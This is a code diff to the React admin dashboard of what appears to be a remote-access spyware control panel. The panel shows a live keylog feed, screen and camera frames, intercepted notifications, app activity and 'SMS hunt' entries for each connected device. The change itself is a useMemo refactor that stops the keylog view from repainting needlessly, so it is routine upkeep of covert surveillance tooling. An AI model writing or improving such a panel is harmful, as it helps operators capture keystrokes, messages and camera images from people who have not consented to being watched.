@@ -1,4 +1,4 @@
-import React, { useState, useCallback, useRef, useEffect } from 'react';
+import React, { useState, useCallback, useRef, useEffect, useMemo } from 'react';
 import { useTcpStream } from './hooks/useTcpStream.js';
 import Sidebar from './components/Sidebar.jsx';
 import DeviceControl from './components/DeviceControl.jsx';
@@ -603,6 +603,13 @@ function AdminDashboard({ logout }) {
     return () => clearInterval(id);
   }, [connected, send]);
 
+  // Stable per-device slice. Building this inline on every render handed the
+  // tabs a new array each time, so their memos re-ran on unrelated state
+  // changes and the live keylog feed repainted continuously.
+  const deviceKeylogEntries = useMemo(
+    () => keylogPushEntries.filter(e => e.deviceId === selectedDevice),
+    [keylogPushEntries, selectedDevice]);
+
   return (
     <div className="app">
       <StatusBar connected={connected} reconnecting={reconnecting} deviceCount={devices.filter(d => d.isOnline).length} onLogout={logout} />
@@ -652,7 +659,7 @@ function AdminDashboard({ logout }) {
               streamFrame={streamFrames[selectedDevice] || null}
               cameraFrame={cameraFrames[selectedDevice] || null}
               send={send}
-              keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
+              keylogPushEntries={deviceKeylogEntries}
               notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
               activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
                smsHuntEntries={smsHuntEntries.filter(e => e.deviceId === selectedDevice)}
